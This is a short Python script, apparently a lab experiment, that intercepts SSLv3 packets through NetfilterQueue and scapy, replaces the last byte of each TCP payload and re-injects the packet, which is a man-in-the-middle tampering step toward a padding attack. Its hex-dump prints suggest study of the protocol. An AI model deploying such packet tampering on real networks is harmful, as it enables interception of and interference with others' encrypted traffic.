#from netfilterqueue import NetfilterQueue
#from scapy.all import IP, TCP
#from scapy.all import *
#from utils.is_sslv3_packet import is_sslv3_packet
#from utils.set_modified_payload_to_packet import set_modified_payload_to_packet
#
#
#def attack_callback(packet):
#    pkt = IP(packet.get_payload())
#
#    packet.accept()
#
#try:
#    nfqueue = NetfilterQueue()
#    nfqueue.bind(0, attack_callback)
#    nfqueue.run()
#except KeyboardInterrupt:
#    pass
#
#nfqueue.unbind()
#

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP
from scapy.all import *
from utils.is_sslv3_packet import is_sslv3_packet
from utils.set_modified_payload_to_packet import set_modified_payload_to_packet


def attack_callback(packet):
    pkt = IP(packet.get_payload())

    # SSLv3パケットかどうかをチェック
    if is_sslv3_packet(pkt):
        # TCPペイロードを取得
        payload = pkt[TCP].payload
       # print("-------------------------------")
       # pkt.show()
       # print(bytes(payload))
       # print("-------------------------------")
        if len(payload) > 0:
            # ペイロードの下位1バイトを変更
            modified_payload = bytes(payload)[:-1] + b'\x33' # 下位1バイトを変更

            print(' '.join(f'{byte:02x}' for byte in bytes(payload)))
            print("-----------------------raw-----------------------")

            print("-----------------ikkomae----------------")
            print(' '.join(f'{byte:02x}' for byte in bytes(payload)[:-1]))
            print("-----------------ikkomae----------------")

            print("-----------------ato----------------")
            print(' '.join(f'{byte:02x}' for byte in modified_payload))
            print("-----------------ato----------------")



            modified_pkt = pkt.copy()
            modified_pkt[TCP].payload = Raw(modified_payload)

            # 新しいペイロードをパケットに設定
            set_modified_payload_to_packet(packet, modified_pkt)
            pkt  = IP(packet.get_payload())

    packet.accept()


try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
